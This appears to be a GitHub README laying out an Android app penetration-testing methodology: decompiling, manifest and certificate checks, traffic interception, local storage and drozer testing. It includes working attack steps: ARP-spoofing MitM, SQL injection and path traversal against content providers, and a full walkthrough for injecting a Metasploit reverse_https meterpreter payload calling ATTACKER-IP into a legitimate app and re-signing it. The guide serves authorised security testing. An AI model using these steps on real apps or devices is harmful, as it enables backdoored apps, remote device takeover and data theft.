<p align="justify">
My primary goal with this repo is to define a comprehensive <b>Android application penetration testing guide</b>. 
This is an operational guide with the intention to assist you while performing a pentest. 
<br><br>
I will provide what I've learned / will learn at work and share it here with you.
To improve this guide, I would highly appreciate your help with everything you have successfully used in the wild and/or experienced so far at work. 
<br><br>
I followed this <a href="https://www.owasp.org/index.php/OWASP_Mobile_Security_Testing_Guide" alt="owasp-url">OWASP Mobile Security Testing Guide</a> and tried to summarize it. 
<br>
<br>
Download the aapg.txt <a href="https://raw.githubusercontent.com/nightowl131/AAPG/master/aapg.txt" target="_blank">here</a>
</p>

<pre>
<b>===========================================================================
============================== 0) Used Tools ==============================
===========================================================================</b>

a) <a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank">apktool</a>
    -) AUR package: yay -S android-apktool
b) <a href="https://github.com/pxb1988/dex2jar" target="_blank">dex2jar</a>
c) <a href="https://github.com/java-decompiler/jd-gui" target="_blank">jd-gui</a>
d) <a href="https://github.com/skylot/jadx" target="_blank">jadx</a>
e) <a href="https://en.droidwiki.org/wiki/Android_Debug_Bridge" target="_blank">adb</a>
    -) sudo pacman -S android-tools
    -) I personally would recommend installing android-studio (it comes with the SDK - including all platform-tools)
        o) sudo pacman -S andriod-studio
f) <a href="https://www.bettercap.org/legacy/index.html#document-install" target="_blank">bettercap</a>
    -) sudo pacman -S bettercap
g) <a href="https://github.com/0xd4d/dnSpy" target="_blank">dnSpy</a>
    -) .NET decompiler (in case of Xamarin Apps)
h) <a href="https://github.com/google/enjarify" target="_blank">enjarify</a>
i) apk decompiler for lazy: https://github.com/b-mueller/apkx

<b>==========================================================================
===================== 1) MANUAL STATIC ANALYSIS ==========================
==========================================================================</b>

<i>////////////////
1a) RETRIEVE APK
////////////////</i>

    FROM THE DEVICE ITSELF
        [COMMANDS]
            o) adb shell pm list packages (list all installed packages)
            o) adb shell pm path com.x.x.x (display apk path of package)
            o) adb pull /data/data/com.x.x.x/app_name.apk (copy the apk file to your system)

    APK DOWNLOADER
        1) Search for your application @ <a href="https://play.google.com/store" target="_blank">https://play.google.com/store</a>
        2) Copy URL (i.e: https://play.google.com/store/apps/details?id=com.whatsapp)
        3) Paste URL into one of the downloaders below or one of your own choice: 
            o) <a href="https://apps.evozi.com/apk-downloader/" target="_blank">evozi</a>
            o) <a href="https://apkcombo.com" target="_blank">apkcombo</a> (recommended)
            o) <a href="https://www.apkmirror.com" target="_blank">apkmirror</a>
<i>/////////////////
1b) DECOMPILE APK
/////////////////</i>

    UNZIP (I'm aware this is just unpacking - not decompiling)
        [COMMANDS]
            o) unzip app_name.apk
        [INFO]
            -) quick & dirty way
            -) Manifest.xml is not readable
            -) However .dex files can be found -&gt; d2j-dex2jar
            -) certs + signature-files available

    APKTOOL
        [COMMANDS]
            o) apktool d path/to/your/app_name.apk (decompiles .dex files to .smali)
            o) apktool d --no-src app_name.apk (does NOT decompile .dex files to .smali)
        [INFO]
            -) not all files do get extracted: i.e certs + signature files & more are missing

    DEX2JAR
        [COMMANDS]
            o) d2j-dex2jar app_name.apk
        [INFO]
            -) extracts decompiled .jar only & app_name-error.zip (open with jd-gui)

    JADX
        [COMMANDS]
            o) jadx -d path/to/extract/ --deobf app_name.apk (jadx-deobfuscator -&gt; deobfs simple obf. code)
            o) jadx -d path/to/extract/ app_name.apk
            o) jadx -d path/to/extract/ classes.dex (outputs .java files at path/to/extract/sources/)
        [INFO]
            -) RECOMMENDED!!
            -) resources + sources available (source code + certs, ...)

    DEOBFUSCATION
        [COMMANDS]
            o) jadx -d path/to/extract/ --deobf app_name.apk
            o) simplify -i file_name.smali -o class.dex
        [INFO]
            -) no 100% success guaranteed --&gt; works only with simple obfuscated files 
            -) to get the file_name.smali --&gt; decompile with APKTOOL

    XAMARIN
        [COMMANDS]
            o) 7z e app_name.apk (unzip apk and retrieve *.dll files)
        [INFO]
            -) Xamarin Apps are written in C#, therefore you have to decompile it on a windows machine (i.e. dnSpy)
            -) Main Code can be found in app_name.dll (but usually there are more too)

<i>/////////////////////
1c) CHECK CERTIFICATE
/////////////////////</i>

    [COMMANDS]
        o) openssl pkcs7 -inform DER -in META-INF/*.RSA -noout -print_certs -text
        o) jarsigner -verify -verbose -certs app_name.apk (optional)

    [INFO]    
        -) jarsigner --&gt; huge output (each file gets validated)
        -) cert location:
            -) unzip.apk --&gt; META-INF/*.RSA
            -) jadx app_name.apk --&gt; resources/META-INF/*.RSA
        -) custom CAs may be definded: res/xml/network_security_config.xml (or similar name)
            -) also cert-pinning info available there (i.e expiration)

    [THINGS TO REPORT]
        !) CN=Android Debug (=debug cert -&gt; public known private key)
        !) CA is expired
        !) The CA that issued the server certificate was unknown
        !) CA was self signed
        !) The server configuration is missing an intermediate CA
        !) no cert-pinning (public key pinning) enabled (if you are able to route traffic through a proxy)
        !) cleartext Traffic is allowed (until Android 8.1): 
            -) &lt;base-config cleartextTrafficPermitted="true"&gt;
            -) &lt;domain-config cleartextTrafficPermitted="true"&gt;

    [MORE DETAILS]
        ?) <a href="https://developer.android.com/reference/android/Manifest.permission.html" target="_blank">Manifest permissions</a>
        ?) <a href="https://developer.android.com/training/articles/security-ssl#CommonProblems" target="_blank">SSL common problems</a>
        ?) <a href="https://www.ssllabs.com/ssltest/" target="_blank">ssltest</a>

<i>///////////////////////////////
1d) ANALYZE ANDROIDMANIFEST.XML
///////////////////////////////</i>

    [COMMANDS]
        RETRIEVE MANIFEST ONLY (already covered if you have properly decompiled the app)
            o) aapt dump app_name.apk AndroidManifest.xml &gt; manifest.txt
            o) aapt l -a app_name.apk &gt; manifest.txt
            o) run app.package.manifest com.x.x.x (within drozer-shell "dr&gt;")

        CREATE BACKUP
            o) adb backup -all -apk -shared (full backup)
            o) adb backup com.x.x.x (single app backup)
            o) decode unencrypted backup
                o) xxd ANDROID BACKUP (check if encrypted --&gt; if you see "none" --&gt; not encrypted)
                o) dd if=all-data.ab bs=24 skip=1 | openssl zlib -d &gt; all-data.tar
                    o) tar xvf all-data.tar (extract tar-archive)
        
    [INFO]
        APPLICATION OVERVIEW
            -) &lt;uses-sdk android:minSdkVersion="23" android:targetSdkVersion="28"/&gt; (Version & Requirements)
            -) &lt;activity android:name="com.x.x.x....MainActivity" ... &gt; (existing activities)
            -) &lt;service android:name="com.x.x.x....SampleService" ... &gt; (used services --&gt; find class which interacts with external resources and databases)

        PERMISSIONS
            -) &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;

        DEBUG APPLICATION
            -) Debugging running apps or processes with <a href="https://source.android.com/devices/tech/debug/gdb" target="_blank">GDB</a> 
        
    [THINGS TO REPORT]
        !) Wrong version/requirements specified
        !) android:allowBackup = TRUE
        !) android:debuggable = TRUE
        !) andorid:exported= TRUE or not set at all (within &lt;provider&gt;-Tag) --&gt; allows external app to access data
        !) android.permission.WRITE_EXTERNAL_STORAGE / READ_EXTERNAL_STORAGE (ONLY IF sensitive data was stored/read externally)
        !) inproper use of permissions
            !) e.g. the app opens website in external browser (not inApp), however requires "android.permission.INTERNET" --&gt; false usage of permissions. (over-privileged)
            !) "android:protectionLevel" was not set properly (&lt;permission android:name="my_custom_permission_name" android:protectionLevel="signature"/&gt;)
            !) missing android:permission (permission tags limit exposure to other apps)
    [MORE DETAILS]
        ?) <a href="https://developer.android.com/guide/topics/manifest/application-element" target="_blank">Application elements</a>
        ?) <a href="https://pentestlab.blog/2017/01/24/security-guidelines-for-android-manifest-files/" target="_blank">Security guidelines for AndroidManifest</a>
        ?) <a href="https://developer.android.com/studio/releases/platforms" target="_blank">Android Platform Releases</a>

<i>////////////////////////
1e) SOURCE CODE ANALYSIS
////////////////////////</i>

    [COMMANDS]
        THINGS TO SEARCH FOR QUICKLY
            o) grep -Ei 'api' -Ei 'http' -Ei 'https' -Ei 'URI' -Ei 'URL' -R . (recursive search for endpoints)
            o) grep -Eio '(http|https)://[^/"]+' -Eio 'content://[^/"]+' -R . (check if strings follow a URL pattern)
            o) grep -Ei 'MODE_WORLD_READABLE' -Ei 'MODE_WORLD_WRITEABLE' -R . (check if improper file permissions were set within the code)
            o) grep -Ei 'getCacheDir' -Ei 'getExternalCacheDirs' -R . (check if sensitive files get saved in cache)
            o) grep -Ei 'localUserSecretStore' -Ei 'getWriteableDatabase' -Ei 'getReadableDatabase' -Ei 'SQLiteDatabase' -Ei 'realm' -Ei 'getDefaultInstance' -Ei 'beginTransaction' -Ei 'insert' -Ei 'query' -Ei 'delete' -Ei 'update' -R . (check for database related stuff)
            o) grep -Ei 'openFileOutput' -Ei 'FileOutputStream' -Ei 'OutputStream' -Ei 'getExternalFilesDir' -R . (check for file operation related stuff)
            o) grep -Ei 'AndroidKeystore' -Ei 'KeyStore' -Ei 'crypto' -Ei 'cipher' -Ei 'store' -R . (check for keystore related stuff)
            o) grep -Ei 'username' -Ei 'user' -Ei 'userid' -Ei 'password' -Ei '.config' -Ei 'secret' -Ei 'pass' -Ei 'passwd' -Ei 'token' -Ei 'login' -Ei 'auth' -R . (search for user related stuff)
            o) grep -Ei 'Log.v' -Ei 'Log.d' -Ei 'Log.i' -Ei 'Log.w' -Ei 'Log.e' -Ei 'log' -Ei 'logger' -Ei 'printStackTrace' -Ei 'System.out.print' -Ei 'System.err.print' -R . (log related stuff)
            o) grep -Ei 'Cursor' -Ei 'content' -Ei 'ContentResolver' -Ei 'CONTENT_URI' -Ei 'Loader' -Ei 'onCreateLoader' -Ei 'LoaderManager' -Ei -R . 
        
        OPEN SOURCE-CODE FILES
            o) jd-gui app-dex2jar.jar (opens .jar/.java/.class files) or use an IDE of your choice (android studio or eclipse)

    [INFO]
        INTERESTING CLASSES
            -) SharedPreferences (stores key-value pairs)
            -) FileOutPutStream (uses internal or external storage)

        INTERESTING FUNCTIONS
            -) getExternal* (uses external storage)
            -) getWriteableDatabase (returns SQLiteDB for writing)
            -) getReadableDatabase (returns SQLiteDB for reading)
            -) getCacheDir / getExternalCacheDirs (uses cached files)
        
    [THINGS TO REPORT]
        !) Cleartext credentials (includes base64 encoded or weak encrypted ones)
        !) Credentials cracked (brute-force, guessing, decrypted with stored cryptographic-key, ...)
        !) File permission MODE_WORLD_READABLE / MODE_WORLD_WRITEABLE (other apps/users are able to read/write)
        !) If http is in use (no SSL)
        !) Anything that shouldn't be there (debug info, comments wiht info disclosure, ...)

<b>==========================================================================
=================== 2) AUTOMATED STATIC ANALYSIS =========================
==========================================================================</b>

    [RECOMMENDED TOOLS] 
        -) <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank">MobSF</a>
        -) <a href="https://github.com/linkedin/qark/" target="_blank">quark</a>
        -) <a href="https://github.com/AndroBugs/AndroBugs_Framework" target="_blank">AndroBugs</a>
        -) <a href="https://github.com/flankerhqd/JAADAS" target="_blank">JAADAS</a>

    [INFO]
        -) At this point you have to google yourself how to install and use them ;)
        -) MobSF + quark are recommended! 

<b>==========================================================================
===================== 3) MANUAL DYNAMIC ANALYSIS =========================
==========================================================================</b>
<i>/////////////////
3a) prerequisites
/////////////////</i>

    [PROXY]
        -) Install <a href="https://portswigger.net/burp/communitydownload" target="_blank">Burp-Suite</a> (recommended)

        [AVD || ROOTED DEVICE]
            -) cert installation:
                ?) <a href="https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device" target="_blank">BEFORE Android 7 (Nougat)</a>
                ?) <a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/" target="_blank">Android 7 or higher</a>
            -) Proxy setup
                ?) <a href="https://developer.android.com/studio/run/emulator-networking#proxy" target="_blank">Virtual device</a>
                ?) <a href="https://www.howtogeek.com/295048/how-to-configure-a-proxy-server-on-android/" target="_blank">Physical phone</a>

        [ADDITIONAL TOOLS]
            -) <a href="https://labs.mwrinfosecurity.com/tools/drozer/" target="_blank">Install drozer on host & phone</a>
            -) <a href="http://www.androiddocs.com/sdk/installing/index.html" target="_blank">Android SDK</a>
                !) adb might be located @ Android/Sdk/platform-tools/ (Linux)
        
        [FUNCTIONALITY TEST]
            COMMANDS:
                o) adb devices (should list your device)
                o) adb forward tcp:31415 tcp:31415 (port forwarding for drozer client)
                o) drozer console devices (list available drozer clients)
                o) drozer console connect (connect to drozer client and end up in drozer-shell: "dr&gt;")

    [NON-PROXY AWARE APPS]
        -) Route traffic through the host machine (e.g. built-in Internet Sharing) --&gt; Wireshark (cli: tshark) or tcpdump
            -) Downside - if HTTPS, you are not able to see any request bodies
            1) tcpdump -i &lt;interface: wlan0&gt; -s0 -w - | nc -l -p 11111 (remotely sniff via netcat)
            2) adb forward tcp:11111 tcp:11111
            3) nc localhost 11111 | wireshark -k -S -i -

        -) MitM with bettercap (same network as target device):
            -) sudo bettercap -eval "set arp.spoof.targets &lt;TARGER-IP&gt;; arps.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex true;" (command may defer due to bettercap version)
        
        -) Redirect with iptables:
            -) iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination &lt;PROXY-IP&gt;:8080
            -) verify iptables settings: iptables -t nat -L
            -) reset iptables config: iptables -t nat -F
        -) Hooking or Code-Injection

        [WHY?]
            -) In case of XAMARIN (ignores system proxy - not always! give it a try before you cry)
            -) Other protocols are used (XMPP or other non-HTTP)
            -) To intercept push notifications
            -) The app itself verifies connection and refuse  

<i>////////////////////////////////
3b) INSTALL APPLICATION & USE IT
////////////////////////////////</i>

    [COMMANDS]
        o) adb install path/to/app_name.apk
            o) In case it does not work:
                o) copy apk to phone and install it directly: adb push app_name.apk /sdcard/
                o) download apk on phone and install it ()

    [INFO]
        ------------------------------------------------------------
        !!!!!INTERCEPT THE WHOLE TRAFFIC FROM THE BEGINNING ON!!!!!!
        ------------------------------------------------------------
        Start using the app, like a normal user would
            o) Log in -&gt; Browse around -&gt; load content & so on ...
            o) Look for:
                o) File up/download
                    o) try to bypass fileupload/-filter (often there is only a client-side validation only)
                o) Activity behaviour & functionality
                o) ANYTHING which indicates a communication to a backend/api or might be stored locally
            o) check proxy and look for suspicious behaviour, requests, new/different endpoints & so on ...

<i>/////////////////////////
3c) ANALYZE LOCAL STORAGE
/////////////////////////</i>

    [COMMANDS]
        LOCAL DATABASE
            o) sqlite3 db_name (open database within adb-shell)
                o) in sqlite-terminal: 
                    o) .tables (lists all tables) --&gt; SELECT * FROM table_name (show table content)
                    o) .schema table_name (shows columns)
                    o) SELECT sql FROM sqlite_master WHERE tbl_name = 'insert_table_name' AND type = 'table'; (see table creation query -&gt; reveals columns as well)
            o) For .realm files:
                o) adb pull path/to/database/on/phone/name.realm path/to/store/db/on/pc/
                o) open within <a href="https://docs.realm.io/sync/realm-studio" target="_blank">RealmStudio</a>

    [INFO]
        COMMON LOCATIONS OF SECRETS/INFORMATION
            -) resources (i.e: res/values/strings.xml)
            -) build configs
            -) /data/data/&lt;com.x.x.x&gt;/ 
                -) shared_prefs/ (search for keysets -&gt; used to encrypt files --&gt; might be encrypted as well, if handled properly)
                -) cache/
                -) database/ (local sqlite database)
            -) /sdcard/Android/&lt;com.x.x.x&gt;/
        
        KEEP YOUR EYES OPEN
            -) developer files
            -) backup files
            -) old files

    [THINGS TO REPORT]
        !) Hardcoded cryptographics key
        !) Cleartext credentials stored in .config/.xml & sqlite-/realm-DB
        !) Misplaced files (i.e. creds.txt stored on SD-Card)
        !) Wrong file permissions set (also have a look @ 1e)

    [MORE DETAILS]
        ?) <a href="https://steemit.com/penetration/@surajraghuvanshi/data-storage-security-on-android" target="_blank">data storage security on android</a>

<i>//////////////////
3d) ATTACK SURFACE
//////////////////</i>

    ----------------
    AT THE BEGINNING
    ----------------
            [COMMANDS]
                DROZER
                    o) run app.package.attacksurface com.x.x.x
            
            [INFO]
                -) lists exported activities, contentprovider, broadcast receivers & services (=makes accessible to other apps)
            
            [THINGS TO REPORT]
                !) "is debuggable" output shows up (allows attaching a debugger to the process, using adb, and step through the code) 

    ---------
    ACTIVITES
    ---------
            [COMMANDS]
                DROZER
                    o) run app.activity.info -a com.x.x.x (display exported acitivities)
                    o) run app.activity.start --component com.x.x.x com.x.x.x.ActivityName (start activity)
                ADB
                    o) adb shell am start -n com.x.x.x/ActivityName
            
            [THINGS TO REPORT]
                !) Bypassed so called "protected" activites (i.e. creds needed) and access sensitive information
                !) Accessed "hidden" activities (if Admin-UI or Debug-UI was implemented)
    
    ----------------
    CONTENT PROVIDER
    ----------------
            [COMMANDS]
                DROZER
                    o) run app.provider.info -a com.x.x.x
                    o) run scanner.provider.finduris -a com.x.x.x (guesses paths & determines accessible content)
                    o) run app.provider.query content://&lt;URI&gt; --vertical (use uris from above or guess yourself)
                        o) in addition: .insert / .update / .delete (google for proper statements)
                    o) run scanner.provider.injection -a com.x.x.x (Test content providers for SQL injection vulnerabilities)
                    o) run scanner.provider.sqltables -a com.x.x.x (Find tables accessible through SQL injection vulnerabilities)
                    ----
                    SQLi
                    ----
                        o) run app.provider.query content://com.x.x.x.ProviderName/path/ --prjection "* FROM SQLITE_MASTER WHERE type='table';--" (list all db tables)
                        o) run app.provider.query content://com.x.x.x.ProviderName/path/ --projection "'" unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
                        o) run app.provider.query content://com.x.x.x.ProviderName/path/ --selection "'" unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
                        o) EXAMPLE:
                            o) run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--" (retreive data from otherwise protected tables)
                    -------------
                    FILESYSTEM-CP
                    -------------
                        o) run app.provider.download content://com.x.x.x.ProviderName/../../../../../../../../data/data/com.x.x.x/database.db /home/user/database.db (download db)
                        o) run scanner.provider.traversal -a com.x.x.x (find content provider that are susceptible to directory traversal)
                        o) run app.provider.read content://com.x.x.x.ProviderName/path/to/file
                        o) EXAMPLE:
                            o) run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts (/etc/hosts is world-readable -&gt; no biggy)
                            o) run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db
                ADB
                    o) adb shell content query --uri content:/com.x.x.x.ProviderName/file_or_path
            
            [THINGS TO REPORT]
                !) Inproper use of permissions (no path permissions, no READ/WRITE permissions)
                !) If SQL Injection is possible
                    !) If weak hash-function was used (like MD5) on passwords or other sensitive data
                !) Accessed db-files

    --------
    SERVICES
    --------
            [COMMANDS]
                DROZER
                    o) run app.service.info -a com.x.x.x (list details on exported services)
                    o) run app.service.send com.your.app com.google.firebase.iid.FirebaseInstanceIdService baaadText 2 3
                        ?) if an error occurs --&gt; analyze the decompiled source code (if available) and try other values until success
            
            [THINGS TO REPORT]
                !) Extracted sensitive data 

    ------------
    MORE DETAILS
    ------------
        ?) <a href="http://showmeshell.top/2018/09/28/How-to-use-drozer/" target="_blank">How to use drozer</a> (for further details translate page)
        ?) <a href="https://mobiletools.mwrinfosecurity.com/Using-Drozer-for-application-security-assessments/" target="_blank">Using drozer</a>
        ?) <a href="https://cyberincision.com/2017/09/13/android-app-hacking-with-drozer-usage/" target="_blank">App hacking with drozer</a>

<i>////////////////
3e) LOG ANALYSIS
////////////////</i>

    [COMMANDS]
        LIVE LOGGING
            -) within adb-shell: ps | grep "&lt;name&gt;" (from com.x.x.x.x)
            -) logcat | grep &lt;process-ID-of-app&gt;
            -) adb logcat | grep "$(adb shell ps | grep com.x.x.x | awk '{print $2}')"
    
    [INFO]
        !) Check if the app created its own logfile: /data/data/com.x.x.x/

    [THINGS TO REPORT]
        !) Sensitive data was exposed within logs/log-files (i.e: "user bob tried to login in with secretpw123") 

<b>==========================================================================
========================== 4) APK TAMPERING ==============================
==========================================================================</b>
<i>//////////////////////////////
4a) SIMPLE REVERSE METERPRETER
//////////////////////////////</i>

    [NON XAMARIN APPS]
        1) msfvenom -p android/meterpreter/reverse_https LHOST=&lt;ATTACKER-IP&gt; LPORT=&lt;ATTACKER-PORT&gt; -o meterpreter.apk
        2) Decompile meterpreter.apk & original app_name.apk
            2.1) apktool d -f -o ./payload_apk /path/to/your/meterpreter.apk
            2.2) apktool d -f -o ./original_apk /path/to/your/app_name.apk
        3) Create folder: mkdir ./original_apk/metasploit; mkdir ./original_apk/metasploit/stage 
        4) Copy payload-files: cp ./payload_apk/smali/com/metasploit/stage/* ./original_apk/smali/metasploit/stage/
        5) Get MainActivity name: Search in AndroidManifest.xml for an &lt;activity&gt;-Tag which contains both:
            5.1) &lt;action android:name="android.intent.action.MAIN"/&gt;
            5.2) &lt;category android:name="android.intent.category.LAUNCHER"/&gt;
            5.3) Look out for the tag-parameter: android:name="core.MainActivity" (it can have a different name, core indicates a directory within the smali dir)
        6) Open the MainActivity.smali:
            6.1) Search for: ;-&gt;onCreate(Landroid/os/Bundle;)V
            6.2) Add the following in the next line (after 6.1): invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V
        7) Copy all necessary app-permissions from ./meterpreter/AndroidManifest.xml into the original ./original_apk/AndroidManifest.xml (check for duplicates -&gt; otherwise some meterpreter functions will not work, due to missing permissions)
        8) Recompile: apktool b ./original_apk
        9) Sign apk: 
            9.1) create key: keytool -genkey -v -keystore my-release-key.keystore -alias myalias  -keyalg RSA -keysize 2048 -validity 10000
                !) remember the password you used
            9.2) sign apk: /home/&lt;user&gt;/Android/Sdk/build-tools/&lt;27.0.3_OR_CHECK_YOUR_USED_VERSION&gt;/apksigner sign --ks my-release-key.keystore ./original_apk/dist/app_name.apk
        10) run a meterpreter session handler:
            10.1) msfconsole
            10.2) use multi/handler
            10.3) set payload android/meterpreter/reverse_https
            10.4) set LHOST &lt;ATTACKER-IP&gt; (same as used to generate the payload - see step 1)
            10.5) set LPORT &lt;ATTACKER-PORT&gt; (same as used to generate the payload - see step 1)
            10.6) run
        11) install apk on device: adb install /path/to/app_with_backdoor.apk
        12) Start app on device
        13) Have fun ;) 

        [INFO]
            -) Guide I excerpted - worked multiple times at work: <a href="https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/" target="_blank">wonderhowto</a>

    XAMARIN APPS
        ?) !!! TBD !!! - dll-injection? I was not able to find anything useful - appreciate any input here!! 

    [THINGS TO REPORT]
        !) If it works (don't give up if it does not work the easy way)

<i>/////////////////////////////////
4b) OTHER WAYS TO BACKDOOR AN APP
/////////////////////////////////</i>

    !!! TBD !!! - appreciate any input here!! 

<i>///////////////
4c) ANDROID NDK
///////////////</i>

    !!! TBD !!! - appreciate any input here!! 

</pre>
